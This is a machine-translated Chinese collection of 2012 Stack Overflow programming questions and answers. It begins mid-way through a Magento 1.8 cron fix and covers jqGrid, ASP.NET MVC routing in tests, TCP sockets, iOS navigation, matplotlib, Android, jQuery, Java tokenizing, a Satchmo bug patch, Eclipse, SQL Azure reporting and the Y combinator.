这在升级到 Magento 1.8.0.0 后开始发生。

在[http://support.m2epro.com/knowledgebase/articles/268105-cron-job-doesn-t-work-since-update-to-magento-1-8的 M2e 知识库中找到以下内容](http://support.m2epro.com/knowledgebase/articles/268105-cron-job-doesn-t-work-since-update-to-magento-1-8)

**自从更新到 magento 1.8 后，Cron 作业不起作用**

cron问题与m2e pro无关，而是与最新magento 1.8版本中cron.php文件的更改有关。

有两种方法可以解决问题：

1.  使用以前版本的 cron.php 文件。您可以从这里下载并复制到您的 magento 安装文件夹中。
2.  另一种方法是更改​​ cron 作业的命令并添加标志 -mdefault 1。（即 php -q /path_to_magento/cron.php -mdefault 1 ）

# sorting - 在 Jqgrid 中排序（加载完成时）

> ID：10499476
> 
> 赞同：0
> 
> 时间：2012-05-08T13:22:11.260
> 
> 标签：sorting, jqgrid

我面临与这篇[文章](https://stackoverflow.com/questions/5619395/jqgrid-sort-on-first-load)中解释的相同的问题。

就我而言，我使用 JSON 将数据加载到网格中。不幸的是，我无法更改查询来进行排序，所以我尝试复制 Oleg 和 Ruffp 的建议，但我不使用“if (data.nodeType)”。现在即使网格正在排序，我也无法选择任何行，因为当我将鼠标指针放在网格内时，它开始闪烁或闪烁（也许我在执行网格时有递归，但我没有把握）。

我应该将超时放在 if 子句中吗？因为我使用的是 JSON，所以使用不同于 data.nodeType 的东西？在那种情况下，应该是哪个子句？

谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:39:15.323

[如果我理解你是正确的，你会在这里](https://stackoverflow.com/a/10287338/315935)找到你问题的答案。我想您使用`datatype: "json"`和`loadonce: true`选项并从服务器完整的*未排序*数据加载（没有分页和排序）。如果您在服务器上实现了分页，但没有排序，那么您应该在[另一个答案](https://stackoverflow.com/a/9047197/315935)中找到问题的解决方案。

# asp.net - 使用非 Web 应用程序中的 Asp.Net MVC 路由（测试）

> ID：10499478
> 
> 赞同：5
> 
> 时间：2012-05-08T13:22:30.343
> 
> 标签：asp.net, asp.net-mvc, bdd, watin, specflow

我正在使用 Watin 为使用 T4MVC 的 Asp.Net MVC 应用程序编写规范流测试。

我发现自己在测试中使用“魔术字符串”网址，这是我不喜欢的。

```
[Given(@"I am on the sign up page")]
public void GivenIAmOnTheSignUpPage()
{
    string rootUrl = ConfigurationManager.AppSettings["RootUrl"];
    string fullUrl = string.Format("{0}/Authentication/Signup",rootUrl);
    WebBrowser.Current.GoTo(fullUrl);
} 
```

我更愿意像在 MVC 应用程序中那样使用我的 T4MVC 操作结果，就像这样......

```
[Given(@"I am on the sign up page")]
public void GivenIAmOnTheSignUpPage()
{
    WebBrowser.Current.GoTo(MVC.Authentication.SignUp().ToAbsoluteUrl());
 } 
```

我的`ToAbsoluteUrl`扩展方法

```
public static class RouteHelper
{
    private static UrlHelper _urlHelper;
    private static string _rootUrl;

    public static string ToAbsoluteUrl(this ActionResult result)
    {
        EnsureUrlHelperInitialized();

        var relativeUrl = _urlHelper.Action(result);
        return string.Format("{0}/{1}", _rootUrl, relativeUrl);
    }

    private static void EnsureUrlHelperInitialized()
    {
        if (_urlHelper==null)
        {
            _rootUrl = ConfigurationManager.AppSettings["RootUrl"];

            var request = new HttpRequest("/", _rootUrl, "");
            var response = new HttpResponse(new StringWriter());
            var context = new HttpContext(request,response);
            HttpContext.Current = context;
            var httpContextBase = new HttpContextWrapper(context);

            RouteTable.Routes.Clear();
            MvcApplication.RegisterRoutes(RouteTable.Routes);

            var requestContext = new RequestContext(httpContextBase, RouteTable.Routes.GetRouteData(httpContextBase));

            _urlHelper = new UrlHelper(requestContext, RouteTable.Routes);
        }
    }
} 
```

初始化 RequestContext 和 RouteCollection 以便生成测试 URL 的正确方法是什么？

目前我收到一个 NullReferenceException 就行了`var requestContext = new RequestContext(httpContextBase, RouteTable.Routes.GetRouteData(httpContextBase));`。这是新建 requestContext 的正确方法吗？

或者，如果有更好的方法来获取 ActionResult（来自 T4MVC）并将其解析为绝对 url，在 web 应用程序之外，这就是我正在寻找的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T19:42:03.737

```
public static class RouteHelper
{
    private static UrlHelper _urlHelper;
    private static string _rootUrl;

    static RouteHelper()
    {
        var routes = new RouteCollection();
        MvcApplication.RegisterRoutes(routes);
        var req = new HttpRequest(string.Empty, "http://www.site.com", null);
        var res = new HttpResponse(null);
        var ctx = new HttpContext(req, res); // do not use HttpContext.Current
        var requestContext = new RequestContext(new HttpContextWrapper(ctx), 
            new RouteData());
        _urlHelper = new UrlHelper(requestContext, routes);
        _rootUrl = ConfigurationManager.AppSettings["RootUrl"];
    }

    public static string ToAbsoluteUrl(this ActionResult result)
    {
        return string.Format("{0}{1}", _rootUrl, _urlHelper.Action(result));
    }
} 
```

静态构造函数设置您的私有字段。我选择使用新的 RouteCollection，而不是使用静态 RouteTable.Routes 属性，但您也许可以。

我不认为 HttpRequest 和 HttpResponse 的构造函数很重要。我只是传入了一些字符串来让它们在不抛出异常的情况下构造。使用它们来构造一个全新的 HttpContext（从 xUnit 运行时不要使用 HttpContext.Current）。然后，您可以将其放入 HttpContextWrapper 以获取您的 HttpContextBase 引用。

构造一个新的 RequestContext，传入你的基本包装器和一个新的 RouteData 实例。使用它与您之前的 RouteCollection 一起构建 UrlHelper。请注意，它的 Action 方法将返回以“/”开头的字符串，因此您应该将其排除在我们的 RootUrl appSetting 之外（因此请使用类似 value="https://develop.site.com" 之类的内容，不带斜杠）。

请注意，这不适用于 MVC 区域中定义的路由。为此，除了在全局 asax 中调用 RegisterRoutes 之外，您还需要注册这些区域。

# c# - 关闭监听器后写入网络流

> ID：10499479
> 
> 赞同：2
> 
> 时间：2012-05-08T13:22:30.713
> 
> 标签：c#, sockets, tcpclient

当使用 tcpclient 写入套接字时，如下例所示

服务器：

```
tcpListener.Start(PendingClientCount);
tcpListener.BeginAcceptTcpClient(OnAcceptCompleted, null);
////and more code 
```

客户：

```
var client = new TcpClient();
client.Connect(new IPEndPoint(IPAddress.Loopback, 50000));
var clientStream = client.GetStream();
if (clientStream.CanWrite)
{
  clientStream.Write(preparedPackage, 0, preparedPackage.Length);
}
clientStream.Close();
client.Close(); 
```

事实证明，通过调用 tcpListener.Close() 和 Dispose() 关闭服务器后，我可以将字节写入网络流，然后它们“无处可去”。经过一定的时间间隔（大约 2 分钟）后，尝试 ti 网络流失败（最后）。

有没有可能检测到在尝试写入时没有人在对面监听套接字？

# iphone - 如何在 UIViewController 上使用 PushViewController？

> ID：10499481
> 
> 赞同：1
> 
> 时间：2012-05-08T13:22:33.917
> 
> 标签：iphone, ipad, uinavigationcontroller, uitableview

我有一个 UIViewController，因为我有一个导航栏和一个表格，现在我想从这个视图导航到另一个选择表格行的视图。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T16:27:30.787

首先，通过右键单击文件和组部分并单击“**新建文件**”选项并将其命名为**SecondViewController** ，将新的 UIViewController 添加到您的应用程序中。

在创建 SecondViewController 时，确保通过选择“ **With XIB for user interface ”选项添加 XIB**

假设您想在按钮单击时推送新视图，然后向您的 FirstViewController 添加一个按钮，并在其按钮的**TouchUpInside**事件中添加以下代码：

```
 SecondViewController *secondView=[[SecondViewController alloc] initWithNibName:@"SecondViewController" bundle:nil];
 [self.navigationController pushViewController:secondView animated:YES];
 [secondView release]; 
```

如果您使用的是 ARC，则删除`[secondView release];`.

如果您需要更多帮助，请告诉我。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:25:49.097

```
 FileName *file=[[FileName alloc] initWithNibName:@"FileName.xib" bundle:nil];
 [self.navigationController pushViewController:file animated:YES];
 [file release]; 
```

# python - 如何重用绘图艺术家（Line2D）？

> ID：10499482
> 
> 赞同：13
> 
> 时间：2012-05-08T13:22:33.980
> 
> 标签：python, matplotlib, seaborn

情节线如何`.plot`在后续情节中重复使用？

我想在 4 个轴上绘制图，每个轴上的前三个单独的图，最后一个轴上的所有 3 个图。这是代码：

```
from numpy import *
from matplotlib.pyplot import *
fig=figure()
data=arange(0,10,0.01)
ax1=fig.add_subplot(2,2,1)
ax2=fig.add_subplot(2,2,2)
ax3=fig.add_subplot(2,2,3)
ax4=fig.add_subplot(2,2,4)

line1=ax1.plot(data,data)
line2=ax2.plot(data, data**2/10, ls='--', color='green')
line3=ax3.plot(data, np.sin(data), color='red')
#could I somehow use previous plots, instead recreating them all?
line4=ax4.plot(data,data)
line4=ax4.plot(data, data**2/10, ls='--', color='green')
line4=ax4.plot(data, np.sin(data), color='red')
show() 
```

结果图片是：
![在此处输入图像描述](../Images/22e7b0006f04ae62add5043d3ffcbee6.png)
有没有办法先定义绘图，然后将它们添加到轴上，然后绘制它们？这是我想到的逻辑：

```
#this is just an example, implementation can be different
line1=plot(data, data)
line2=plot(data, data**2/10, ls='--', color='green')
line3=plot(data, np.sin(data), color='red')
line4=[line1, line2, line3] 
```

现在在 ax1 上绘制 line1，在 ax2 上绘制 line2，在 ax3 上绘制 line3，在 ax4 上绘制 line4。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T18:01:12.433

*   OP 中请求的实现不起作用，因为无法重用[`Line2D`](https://matplotlib.org/stable/api/_as_gen/matplotlib.lines.Line2D.html#matplotlib.lines.Line2D)返回的绘图 Artist 。[`plt.plot`](https://matplotlib.org/stable/api/_as_gen/matplotlib.pyplot.plot.html)尝试这样做，将导致`RuntimeError`as per[`def set_figure(self, fig):`](https://matplotlib.org/stable/_modules/matplotlib/artist.html#Artist.set_figure)
    *   `line1`在 OP 中，与`line1`直接使用`Line2D`方法创建的不同，因为绘制的 Artist 具有不同的属性。
    *   关于`seaborn`和 API `matplotlib`，轴级图如[`seaborn.lineplot`](https://seaborn.pydata.org/generated/seaborn.lineplot.html)返回`axes`：
        *   `p = sns.lineplot(...)`然后`p.get_children()`获取 Artist 对象。
*   可以使用类似的方法直接创建绘图艺术家[`matplotlib.lines.Line2D`](https://matplotlib.org/stable/api/_as_gen/matplotlib.lines.Line2D.html)，并在多个绘图中重复使用。
*   使用标准导入实践、子图更新代码，而不是使用列表理解来获得副作用（python 反模式）。
*   **经测试`python 3.8.11`，`matplotlib 3.4.3`**

```
import numpy as np
from copy import copy
import matplotlib.pyplot as plt
from matplotlib.lines import Line2D

# crate the figure and subplots
fig, axes = plt.subplots(2, 2)

# flatten axes into 1-D for easy indexing and iteration
axes = axes.ravel()

# test data
data=np.arange(0, 10, 0.01)

# create test lines
line1 = Line2D(data, data)
line2 = Line2D(data, data**2/10, ls='--', color='green')
line3 = Line2D(data, np.sin(data), color='red')
lines = [line1, line2, line3]

# add the copies of the lines to the first 3 subplots
for ax, line in zip(axes[0:-1], lines):
    ax.add_line(copy(line))

# add 3 lines to the 4th subplot
for line in lines:
    axes[3].add_line(line)

# autoscale all the subplots if needed
for _a in axes:
    _a.autoscale()

plt.show() 
```

[![在此处输入图像描述](../Images/8160e754acd9b874d0636bc4ad4b1870.png)](https://i.stack.imgur.com/CbuSf.png)

## 原始答案

*   这是一种可能的解决方案。我不确定它是否非常漂亮，但至少它不需要重复代码。

```
import numpy as np, copy
import matplotlib.pyplot as plt, matplotlib.lines as ml

fig=plt.figure(1)
data=np.arange(0,10,0.01)
ax1=fig.add_subplot(2,2,1)
ax2=fig.add_subplot(2,2,2)
ax3=fig.add_subplot(2,2,3)
ax4=fig.add_subplot(2,2,4)

#create the lines
line1=ml.Line2D(data,data)
line2=ml.Line2D(data,data**2/10,ls='--',color='green')
line3=ml.Line2D(data,np.sin(data),color='red')
#add the copies of the lines to the first 3 panels
ax1.add_line(copy.copy(line1))
ax2.add_line(copy.copy(line2))
ax3.add_line(copy.copy(line3))

[ax4.add_line(_l) for _l in [line1,line2,line3]] # add 3 lines to the 4th panel

[_a.autoscale() for _a in [ax1,ax2,ax3,ax4]] # autoscale if needed
plt.draw() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T14:00:48.950

我认为您的用法很好，但是您可以将所有`x,y`数据对传递给`plot`这样的（尽管它使阅读变得非常可怕！）：

```
ax4.plot(data, data, data, data**2 / 10, data, np.sin(data)) 
```

一个有趣的不同方法是这样的：

```
graph_data = [(data, data), (data, data**2 / 10), (data, np.sin(data))]
[ax4.plot(i,j) for i,j in graph_data] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-12-13T09:48:27.043

我在 jupyter notebook 中有一个更简单的用例。鉴于您在某处存储了一个图形对象，您如何重新绘制它。例如：

单元格 1：

```
f = plt.figure(figsize=(18, 6))
f.suptitle("Hierarchical Clustring", fontsize=20)
dendrogram(Z, color_threshold=cut_off,
           truncate_mode='lastp',
           p=20) 
```

单元格 2：

```
#plot f again, the answer is really simple
f
plt.show() 
```

而已。这样做的好处是您可以将图形存储在对象中，然后在必要时使用它们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-12T09:06:22.947

[这个问题](https://stackoverflow.com/questions/34162443/why-do-many-examples-use-fig-ax-plt-subplots-in-matplotlib-pyplot-python)也有一个很好的例子，可以使用以下方法引用以前的轴：

```
fix, ax = plt.subplots(2, 2)
ax[0,1].plot(data, data**2 / 10, ls='--', color='g') 
```

但还解释了如何使用以下方法在每个子图上插入标题：

```
ax[0,1].set_title('Simple plot') 
```

ax 的维度取决于子图参数：如果它们只是水平或垂直平铺，则 ax 只需要一个索引。

# android - 如何在当前按下的按钮上移动文本？

> ID：10499490
> 
> 赞同：3
> 
> 时间：2012-05-08T13:22:51.123
> 
> 标签：android

我想稍微移动一下当前按下的按钮上的文本。在我的情况下，按钮具有自定义背景，如果文本被移动，按钮看起来会更好。

我制作了两个具有不同填充的 NinePath 图像：

![在此处输入图像描述](../Images/09c9c0131195f2b23033c881fdad524e.png)

![在此处输入图像描述](../Images/36171d537d2a0a0a35eb028dc33c21ff.png)

并使用选择器设置它们：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:drawable="@drawable/btn_pressed" android:state_pressed="true"/>
    <item android:drawable="@drawable/btn"/>

</selector> 
```

这不起作用，按下按钮时文本保持在其位置（并且背景被交换）。

我的 NinePath 图像正常吗？有没有办法在不设置触摸监听器的情况下移动文本？

PS 已经问过同样的问题，但“答案”正是我尝试过的解决方案：[https ://stackoverflow.com/a/7677098/694770](https://stackoverflow.com/a/7677098/694770)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T20:13:08.633

您的 9 补丁图像看起来不错。也就是说，我遇到了这个问题，因为我遇到了完全相同的问题，而且我的图像也不起作用。

我最终将子类`Button`化并弄乱了填充。[更多信息在这里](https://stackoverflow.com/a/11748170/5821)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:59:35.793

尝试这个

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:text="Pressed state text" android:state_pressed="true"/>
    <item android:text="Default text"/>

</selector> 
```

# jquery - JQuery 将 div 隐藏在 children() 数组中

> ID：10499495
> 
> 赞同：0
> 
> 时间：2012-05-08T13:23:06.177
> 
> 标签：jquery, fade

我有下一个数组：

```
var Images = $('.cs_slider').children(); 
```

检查了数组，它不为空。

该数组包含 div，每个 div 里面都有另一个 div。

我想在下一张幻灯片`fadeOut()`的内部 div ( ) 上使用。`.info`

我尝试使用它，但它不起作用（一个月前从 JQuery 开始）：

```
Images[CurrentImage].('.info').fadeOut(); 
```

`CurrentImage`肯定是整数。

效果应该只运行一次，所以循环不是我的意思。有什么想法有什么问题吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:24:52.480

试试这个：

```
$('.info', Images[CurrentImage]).fadeOut(); 
```

这相当于：

```
$(Images[CurrentImage]).find('.info').fadeOut(); 
```

注意`Images[CurrentImage]`¹是一个 DOM 元素，而不是一个 jQuery 对象。

* * *

¹ *注意：这些是错误的变量名 - 大写通常保留给类*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:26:05.053

```
Images.eq(CurrentImage).find('.info').fadeOut(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:27:28.533

试试这个

```
($Images[CurrentImage]).find('.info').fadeOut(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:27:58.330

您的更多源代码会有所帮助，但看起来您没有正确使用选择器。尝试这样的事情：

$( Images[CurrentImage] + ' .info ).fadeOut();

This will end up looking something like this to jQuery:

$( 'div_name .info' ).fadeOut();

Again, next time please let us see more of your source code or start up a JSFiddle

# iphone - 允许用户从 iPhone 应用程序的游戏列表中进行选择的最佳方式是什么？

> ID：10499496
> 
> 赞同：0
> 
> 时间：2012-05-08T13:23:09.127
> 
> 标签：iphone, xcode, uitableview, instantiation

我有一个 iphone 应用程序，我正在尝试创建用户可以从各种“级别”中选择的地方，但我希望以后能够更改级别的数量，所以我不只是想创建一个几个静态按钮，而是一个动态的级别列表。

我的游戏中“关卡”之间的唯一区别是地图视图中使用的坐标，所以我真正想要的是一个动态的关卡列表，一旦点击，它就会转到我的地图视图并自动填充坐标数组与相关给定用户级别选择的坐标。

实现这一点的最佳方法是什么？TableView 看起来像正确的格式，但我见过的唯一示例是列表，一旦选择了表中的项目，就不会转到不同的视图，更不用说将数据从该选择传递到下一个视图。

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:39:46.693

如果您不想进入更高级的代码，请使用表格视图。选择一行后，将其行号（选择）保存在单例中（您可以为此使用应用程序委托）并在导航控制器上使用地图推送视图 - 该视图将“询问”单例进行选择。

如果你不怕弄脏你的手，你可以在 UIScrollView 上创建 UIButtons（或其他可点击控件）的动态列表。对于奖励积分，将超过 1 个按钮放在一行上（有点像 iPhone“桌面”上的应用程序图标）。当一个人被选中时，将选择保存在单例中（像以前一样）。

# java - 在 Stringtokenizer 中使用句号作为字符串分隔符

> ID：10499501
> 
> 赞同：0
> 
> 时间：2012-05-08T13:23:25.243
> 
> 标签：java, stringtokenizer

我想`.`从字符串标记中排除句号，例如以下情况：

```
 I go to school. 
```

想生成令牌为：

```
 [ I] [go] [to] [school] 
```

我使用 stringTokenizer 作为：

```
List<String> listStr = new ArrayList<String>();
StringTokenizer strToken = new StringTokenizer(str);                    
int i =0;
while(strToken.hasMoreTokens()){
    listStr.add(i, strToken.nextToken());
    i=i+1;
} 
```

但最后一个令牌是`school.`我不想要的。我该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:25:31.747

这不是更简单吗？

```
List<String> list = Arrays.asList("I go to school.".split("[ .]")); 
```

`System.out.println(list)`印刷

```
[I, go, to, school] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:28:01.683

StringTokenizer 有一个[构造函数](http://docs.oracle.com/javase/6/docs/api/java/util/StringTokenizer.html#StringTokenizer%28java.lang.String,%20java.lang.String%29)，它接受另一个参数：充当分隔符的字符。以下代码说明了这一点：

```
StringTokenizer tokenizer = new StringTokenizer("I go to school.", " \t\r\n.");
while(tokenizer.hasMoreElements()) {
    System.out.println(tokenizer.nextElement());
} 
```

这是输出，应该是你想要的：

```
I
go
to
school 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:25:54.427

您可以在初始字符串上执行此操作：`string.replace(".", "")`然后执行标记器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:29:35.970

StringTokenizer 可以使用很多分隔符，因此现在在您的情况下，您应该按以下方式构建 srink 标记器：

```
new StringTokenizer(yourString, " ."); 
```

就是这样。

希望能帮助到你。

# django - 创建新帐户时联系人被劫持

> ID：10499503
> 
> 赞同：0
> 
> 时间：2012-05-08T13:23:29.577
> 
> 标签：django, satchmo

在我的 Satchmo 项目中，我有一个令人讨厌的错误，其中 contact_contact 表中的一行正在重新分配给新用户。

如果我在一个浏览器窗口中登录商店，然后（在另一个新窗口中）通过浏览 /accounts/register/ 创建一个新帐户，就会发生这种情况。如果我先注销，它不会发生。

数据库中发生的事情是我登录的原始用户（他的用户配置文件全部设置）“丢失”了他的用户配置文件。发生的事情是该用户的“联系人”不再存在，因为它现在“指向”新用户。即它的user_id 字段现在指向auth_user 中的新'id'。联系人记录的内容会被新用户的信息覆盖。

除了更改registration_form.html之外，我没有对Satchmo中的登录代码进行任何更改

会不会是注册表正在从 POST 请求中读取部分用户信息，并接管属于之前用户的联系人？

我重现了故障，然后在数据库上做了一个“差异”。这是吸烟枪：

```
+INSERT INTO "auth_user" VALUES(138,'newuser','New','User','y@n.org',...

-INSERT INTO "contact_contact" VALUES(1,'','Old','User',2,'Customer',NULL,'1999-01-01','x@n.org','','2012-04-30');
+INSERT INTO "contact_contact" VALUES(1,'','New','User',138,'Customer',NULL,'1999-02-02','y@n.org','','2012-04-30'); 
```

您可以清楚地看到 a) 记录号 1 正在被重复使用，并且 b) 它现在指向使用 id 138 创建的新用户。

非常感谢，托马斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T05:38:25.367

我很确定这是 Satchmo 中的一个错误。这是我的修复：

```
diff -paurb src.orig//satchmo/satchmo/apps/satchmo_store/accounts/views.py src//satchmo/satchmo/apps/satchmo_store/accounts/views.py
--- src.orig//satchmo/satchmo/apps/satchmo_store/accounts/views.py    2012-03-30 07:42:40.000000000 +0200
+++ src//satchmo/satchmo/apps/satchmo_store/accounts/views.py   2012-05-09 07:33:01.000000000 +0200
@@ -194,7 +194,7 @@ def register_handle_form(request, redire
     if request.method == 'POST':
         form = RegistrationForm(request.POST)
         if form.is_valid():
-            contact = form.save(request)
+            contact = form.save(request,force_new=True)

             # look for explicit "next"
             next = request.POST.get('next', '') 
```

# eclipse - 我可以增加 Eclipse 中可见的打开文件选项卡的数量吗

> ID：10499504
> 
> 赞同：5
> 
> 时间：2012-05-08T13:23:29.453
> 
> 标签：eclipse, eclipse-indigo

我正在使用 Eclipse Indigo，目前一次只能看到 6 个打开的文件选项卡，如果我打开更多，那么它们会保持打开状态，但文件会出现在下拉列表中并且不可见。
是否可以配置为在选项卡上显示至少 10 个打开和可见的文件。
谢谢，拉胡尔。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:25:49.097

eclipse 上的可见选项卡由区域的宽度决定，区域越大，您可以看到的选项卡越多...

# reporting - 没有为 SQL Azure 报告输入凭据

> ID：10499511
> 
> 赞同：0
> 
> 时间：2012-05-08T13:23:44.947
> 
> 标签：reporting, azure-sql-database, credentials

情况：

我在 Visual Studio 2010 中设置了一个 Windows Azure webrole，以从报告服务器获取 SQL 报告，一切正常。

问题：

每次我想检查报告并运行程序时，我都必须输入报告的凭据，我不知道如何关闭它。即使在服务器上我也必须输入它们，但我似乎无法找到公开报告的方法.. 我发现管理很混乱..

有人知道怎么做这个吗？这是程序运行时的样子

![在此处输入图像描述](../Images/fe1a7e6e8c8f12b87777f76d6c4d9a43.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T21:14:50.700

根据您提供的内容：

1.  您有一个连接到 SQL Azure 报表服务器的 ASP.NET Web 角色
2.  每当您启动 ASP.NET Web 角色时，您需要输入凭据以访问报告，如图所示
3.  您正在寻找一种在 WebRole 中添加用户名/密码的方法，以便访问该网页的任何人都可以查看报告。

这是答案：

1.  在通过基于报表查看器控件的 Web 角色的 SQL Azure 报表中，您可以将用户名和密码与 RSServer（报表服务器）名称一起添加到 Global.config
2.  这样，当您的基于 ASP.NET 的报表查看器应用程序将运行时，它将具有已可用的所需凭据以连接到报表服务器。

以下链接显示了有关如何实现目标的详细信息：http: [//oakleafblog.blogspot.com/2011/10/pass-summit-sql-azure-reporting_8267.html](http://oakleafblog.blogspot.com/2011/10/pass-summit-sql-azure-reporting_8267.html)

您可以从以下链接获取 SQL Azure 特定的报告查看器示例：http: [//social.technet.microsoft.com/wiki/contents/articles/sql-azure-reporting-samples.aspx](http://social.technet.microsoft.com/wiki/contents/articles/sql-azure-reporting-samples.aspx)

# scheme - “The Little Schemer”中的 Y 组合器讨论

> ID：10499514
> 
> 赞同：35
> 
> 时间：2012-05-08T13:24:00.213
> 
> 标签：scheme, combinators, y-combinator, the-little-schemer

因此，我花了很多时间阅读和重新阅读*The Little Schemer*中第 9 章的结尾，其中为该`length`功能开发了应用 Y 组合器。我认为我的困惑归结为一个对比两个版本的长度的声明（在组合器被分解之前）：

```
A:
  ((lambda (mk-length)
     (mk-length mk-length))
   (lambda (mk-length)
     (lambda (l)
       (cond
         ((null? l) 0 )
         (else (add1
                ((mk-length mk-length)
                 (cdr l))))))))

B:
((lambda (mk-length)
      (mk-length mk-length))
    (lambda (mk-length)
      ((lambda (length)
         (lambda (l)
           (cond
             ((null? l) 0)
             (else (add1 (length (cdr l)))))))
       (mk-length mk-length)))) 
```

[第 170 页（第 4 版）](https://books.google.com.ua/books?id=xyO-KLexVnMC&pg=PA170#v=onepage&q&f=false)指出，A

> 当我们将它应用于参数时返回一个函数

而乙

> 不返回函数

从而产生自我应用的无限倒退。我被这件事难住了。如果 B 受到这个问题的困扰，我看不出 A 是如何避免的。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-08-08T12:47:11.220

好问题。为了那些没有正常运行 DrRacket 安装~~（包括我自己）~~的人的利益，我将尝试回答它。

首先，让我们使用一些健全的（短）变量名称，人眼/头脑可以轻松跟踪：

```
((lambda (h)     ; A.   
     (h h))            ; apply h to h
 (lambda (g)
     (lambda (lst)
       (if (null? lst) 0
         (add1 
               ((g g) (cdr lst))))))) 
```

第一个 lambda 项是所谓的[little omega 或**U**组合](http://en.wikipedia.org/wiki/Lambda_calculus#Standard_terms)器。当应用于某物时，它会导致该术语的自我应用。因此以上等价于

```
(let ((h (lambda (g)
           (lambda (lst)
             (if (null? lst) 0
               (add1 ((g g) (cdr lst))))))))
  (h h)) 
```

当`h`应用于 时`h`，会形成新的绑定：

```
(let ((h (lambda (g)
           (lambda (lst)
             (if (null? lst) 0
               (add1 ((g g) (cdr lst))))))))
  (let ((g h))
    (lambda (lst)
            (if (null? lst) 0
              (add1 ((g g) (cdr lst))))))) 
```

现在没有什么可以应用了，所以`lambda`返回了内部形式——连同`let`它上面的环境框架（即那些绑定）的隐藏链接。

lambda 表达式与其定义环境的这种配对称为[闭包](http://en.wikipedia.org/wiki/Closure_(computer_science))。对外界来说，它只是一个参数的另一个函数，`lst`. 目前没有更多的减少步骤可以在那里执行。

现在，当那个闭包——我们的`list-length`函数——将被调用时，执行最终将到达`(g g)`自我应用的点，并且将再次执行上述相同的归约步骤。但不是更早。

* * *

现在，那本书的作者想要得到**Y**组合器，所以他们对第一个表达式应用了一些代码转换，以某种方式安排自动执行自我应用程序`(g g)`——所以我们可以用普通的递归函数应用程序编写方式，，`(f x)`而不必像`((g g) x)`所有递归调用一样编写它：

```
((lambda (h)     ; B.
     (h h))            ; apply h to h
 (lambda (g)
   ((lambda (f)           ; 'f' to become bound to '(g g)',
      (lambda (lst) 
        (if (null? lst) 0
          (add1 (f (cdr lst))))))  ; here: (f x) instead of ((g g) x)!
    (g g))))                       ; (this is not quite right) 
```

现在经过几个减少步骤，我们到达

```
(let ((h (lambda (g)
           ((lambda (f)    
              (lambda (lst) 
                (if (null? lst) 0
                  (add1 (f (cdr lst))))))
            (g g)))))
  (let ((g h))
    ((lambda (f)
       (lambda (lst)
            (if (null? lst) 0
              (add1 (f (cdr lst))))))
     (g g)))) 
```

这相当于

```
(let ((h (lambda (g)
           ((lambda (f)    
              (lambda (lst) 
                (if (null? lst) 0
                  (add1 (f (cdr lst))))))
            (g g)))))
  (let ((g h))
    (let ((f (g g)))           ; problem! (under applicative-order evaluation)
       (lambda (lst)
            (if (null? lst) 0
              (add1 (f (cdr lst)))))))) 
```

麻烦来了：在内部 lambda 甚至可以作为闭包返回给运行时系统*之前*，自我应用`(g g)`执行得太早了。我们只希望在调用闭包*之后*执行到lambda 表达式*内的那个点时减少它。*在创建闭包之前减少它是荒谬的。一个*微妙的*错误。:)

 ***当然，由于`g`is bound to `h`，`(g g)`被简化为`(h h)`，我们又回到了我们开始的地方，`h`申请`h`. 循环播放。

* * *

作者当然知道这一点。他们也希望*我们*理解它。

所以罪魁祸首很简单——它是[评估的应用顺序](http://en.wikipedia.org/wiki/Evaluation_strategy#Applicative_order)：在绑定由函数的形参及其参数的*值形成**之前**评估*参数。

 **那么，代码转换并不完全正确。它本来可以在不预先评估参数的[正常顺序下工作。](http://en.wikipedia.org/wiki/Evaluation_strategy#Normal_order)

这可以通过“ [eta-expansion](http://en.wikipedia.org/wiki/Lambda_calculus#.CE.B7-conversion) ”轻松解决，它将应用程序延迟到实际调用点：`(lambda (x) ((g g) x))`实际上是说：“***将***在使用参数调用`((g g) x)`时调用`x`”。

这实际上是代码转换应该放在首位的：

```
((lambda (h)     ; C.
     (h h))            ; apply h to h
 (lambda (g)
   ((lambda (f)           ; 'f' to become bound to '(lambda (x) ((g g) x))',
      (lambda (lst) 
        (if (null? lst) 0
          (add1 (f (cdr lst))))))  ; here: (f x) instead of ((g g) x)
    (lambda (x) ((g g) x))))) 
```

现在可以执行下一个缩减步骤：

```
(let ((h (lambda (g)
           ((lambda (f)    
              (lambda (lst) 
                (if (null? lst) 0
                  (add1 (f (cdr lst))))))
            (lambda (x) ((g g) x))))))
  (let ((g h))
    (let ((f (lambda (x) ((g g) x))))       ; here it's OK
      (lambda (lst)
            (if (null? lst) 0
              (add1 (f (cdr lst)))))))) 
```

并且闭包`(lambda (lst) ...)`在没有问题的情况下形成并返回，当`(f (cdr lst))`被调用时（在闭包内），它会减少到`((g g) (cdr lst))`我们想要的样子。

* * *

